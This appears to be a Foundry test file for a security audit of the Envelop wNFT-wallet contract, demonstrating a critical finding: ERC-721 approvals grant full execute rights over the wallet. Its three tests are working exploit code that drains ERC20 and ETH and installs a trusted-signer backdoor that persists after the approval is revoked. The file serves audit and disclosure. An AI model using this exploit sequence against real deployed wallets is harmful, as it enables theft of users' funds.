// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";

import {EnvelopWNFTFactory} from "../../src/EnvelopWNFTFactory.sol";
import {MockERC20} from "../../src/mock/MockERC20.sol";
import {WNFTV2Envelop721} from "../../src/impl/WNFTV2Envelop721.sol";

/// @dev Task #4, Finding #1 (CRITICAL):
/// ERC-721 approval mechanisms (`approve` and `setApprovalForAll`) grant
/// the approved address full execution authority over the wNFT-wallet.
/// An NFT owner who lists the wNFT on a marketplace (i.e. does the most
/// ordinary ERC-721 action) hands the marketplace contract — or anyone
/// it acts as — the keys to drain every asset the wallet holds, without
/// the wNFT itself ever being transferred.
contract WNFTV2Envelop721_Audit_a_01 is Test {
    address internal alice; // wNFT owner / victim
    address internal attacker; // address that gets innocuously approved

    EnvelopWNFTFactory internal factory;
    WNFTV2Envelop721 internal impl;
    WNFTV2Envelop721 internal wnft; // proxy clone
    MockERC20 internal erc20;

    uint256 internal constant INIT_ERC20_DEPOSIT = 100 ether;
    uint256 internal constant INIT_ETH_DEPOSIT = 1 ether;

    receive() external payable {}

    function setUp() public {
        alice = makeAddr("alice");
        attacker = makeAddr("attacker");

        vm.deal(address(this), 10 ether);
        vm.deal(alice, 10 ether);

        factory = new EnvelopWNFTFactory();
        impl = new WNFTV2Envelop721(address(factory));
        factory.setWrapperStatus(address(impl), true);

        erc20 = new MockERC20("Mock", "MOCK");

        // Alice mints a wNFT-wallet — InitParams with no rules and no locks.
        WNFTV2Envelop721.InitParams memory init = WNFTV2Envelop721.InitParams({
            creator: alice,
            nftName: "Envelop Wallet",
            nftSymbol: "ENVW",
            tokenUri: "",
            addrParams: new address[](0),
            hashedParams: new bytes32[](0),
            numberParams: new uint256[](0),
            bytesParam: ""
        });

        vm.prank(alice);
        address payable wnftAddr = payable(impl.createWNFTonFactory(init));
        wnft = WNFTV2Envelop721(wnftAddr);

        // Seed the wallet with ETH and ERC20 — the assets we expect to be drained.
        erc20.transfer(address(wnft), INIT_ERC20_DEPOSIT);
        (bool ok,) = address(wnft).call{value: INIT_ETH_DEPOSIT}("");
        require(ok, "seed eth failed");

        // Sanity: wNFT belongs to Alice, wallet holds the funds.
        assertEq(wnft.ownerOf(1), alice, "setUp: owner");
        assertEq(erc20.balanceOf(address(wnft)), INIT_ERC20_DEPOSIT, "setUp: erc20 in wallet");
        assertEq(address(wnft).balance, INIT_ETH_DEPOSIT, "setUp: eth in wallet");
    }

    /// @dev Vector 1 — Alice does the most innocent thing an NFT owner does
    /// to interact with a marketplace: `setApprovalForAll(attacker, true)`.
    /// Attacker (or anyone the operator address acts as — a compromised
    /// marketplace, a malicious admin behind it, etc.) immediately drains
    /// every asset held by the wallet without ever moving the NFT.
    function test_setApprovalForAll_drains_wallet() public {
        vm.prank(alice);
        wnft.setApprovalForAll(attacker, true);

        // Drain ERC20.
        bytes memory erc20Payload =
            abi.encodeWithSignature("transfer(address,uint256)", attacker, INIT_ERC20_DEPOSIT);

        vm.prank(attacker);
        wnft.executeEncodedTx(address(erc20), 0, erc20Payload);

        // Drain ETH (empty calldata triggers the SmartWallet `sendValue` branch).
        vm.prank(attacker);
        wnft.executeEncodedTx(attacker, INIT_ETH_DEPOSIT, "");

        // Wallet is empty, attacker has it all, and the wNFT never moved.
        assertEq(erc20.balanceOf(attacker), INIT_ERC20_DEPOSIT, "attacker holds drained erc20");
        assertEq(erc20.balanceOf(address(wnft)), 0, "wallet erc20 zeroed");
        assertEq(attacker.balance, INIT_ETH_DEPOSIT, "attacker holds drained eth");
        assertEq(address(wnft).balance, 0, "wallet eth zeroed");
        assertEq(wnft.ownerOf(1), alice, "wNFT itself was never transferred");
    }

    /// @dev Vector 2 — single-token approval (`approve(operator, TOKEN_ID)`)
    /// is the same trap. Lifting wallet-execute privileges via the
    /// per-tokenId approval branch (`getApproved(TOKEN_ID) == _sender`) is
    /// just as deadly. This is what would happen if Alice listed her wNFT
    /// for sale on a marketplace that uses the single-token approval flow.
    function test_approval_drains_wallet() public {
        vm.prank(alice);
        wnft.approve(attacker, 1); // TOKEN_ID == 1

        bytes memory erc20Payload =
            abi.encodeWithSignature("transfer(address,uint256)", attacker, INIT_ERC20_DEPOSIT);

        vm.prank(attacker);
        wnft.executeEncodedTx(address(erc20), 0, erc20Payload);

        vm.prank(attacker);
        wnft.executeEncodedTx(attacker, INIT_ETH_DEPOSIT, "");

        assertEq(erc20.balanceOf(attacker), INIT_ERC20_DEPOSIT, "attacker drained erc20 via single approval");
        assertEq(attacker.balance, INIT_ETH_DEPOSIT, "attacker drained eth via single approval");
        assertEq(address(wnft).balance, 0, "wallet eth zeroed");
        assertEq(wnft.ownerOf(1), alice, "wNFT itself was never transferred");
    }

    /// @dev Vector 3 — the same approval channel grants control over the
    /// wallet's *administrative* surface too: the operator can hand
    /// themselves a permanent `trustedSigner` slot, so that even after
    /// Alice revokes the ERC-721 approval the attacker still has full
    /// execution authority via `executeEncodedTxBySignature`. This shows
    /// that the bug isn't bounded by the lifetime of the approval — once
    /// granted, the attacker can persist privileges.
    function test_approval_lets_attacker_install_permanent_backdoor() public {
        vm.prank(alice);
        wnft.setApprovalForAll(attacker, true);

        // Attacker installs themselves as a trusted signer.
        vm.prank(attacker);
        wnft.setSignerStatus(attacker, true);

        assertTrue(wnft.getSignerStatus(attacker), "attacker is now a trusted signer");

        // Alice realises something is off and revokes the operator approval.
        vm.prank(alice);
        wnft.setApprovalForAll(attacker, false);

        // Approval-based path is now blocked — good.
        vm.prank(attacker);
        vm.expectRevert(bytes("Only for wNFT owner"));
        wnft.executeEncodedTx(address(erc20), 0, "");

        // But the signer-based path still works, so the attacker keeps draining.
        bytes memory erc20Payload =
            abi.encodeWithSignature("transfer(address,uint256)", attacker, INIT_ERC20_DEPOSIT);
        bytes32 digest = wnft.getDigestForSign(address(erc20), 0, erc20Payload, attacker);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_privKeyFor(attacker), _ethSigned(digest));
        bytes memory sig = abi.encodePacked(r, s, v);

        // Attacker sends from their own EOA, signing as themselves (now a trusted signer).
        vm.prank(attacker);
        wnft.executeEncodedTxBySignature(address(erc20), 0, erc20Payload, sig);

        assertEq(erc20.balanceOf(attacker), INIT_ERC20_DEPOSIT, "drain continues after revocation");
    }

    /// Helper — re-derive the EOA private key the way `makeAddr` does, so we
    /// can sign in the same way the rest of the suite does.
    function _privKeyFor(address a) internal view returns (uint256 pk) {
        // forge-std's `makeAddr(name)` returns `vm.addr(uint256(keccak256(bytes(name))))`,
        // so the private key is just the keccak of the name. We stored the address
        // via makeAddr at setUp, but we can rebuild via the inverse trick: this test
        // creates fresh `attacker` via the same scheme.
        // (Keeps the test self-contained — no makeAddrAndKey churn.)
        pk = uint256(keccak256(bytes(_nameFor(a))));
    }

    function _nameFor(address a) internal view returns (string memory) {
        if (a == attacker) return "attacker";
        revert("no name");
    }

    function _ethSigned(bytes32 digest) internal pure returns (bytes32) {
        // toEthSignedMessageHash to match _restoreDigestWasSigned
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
    }
}
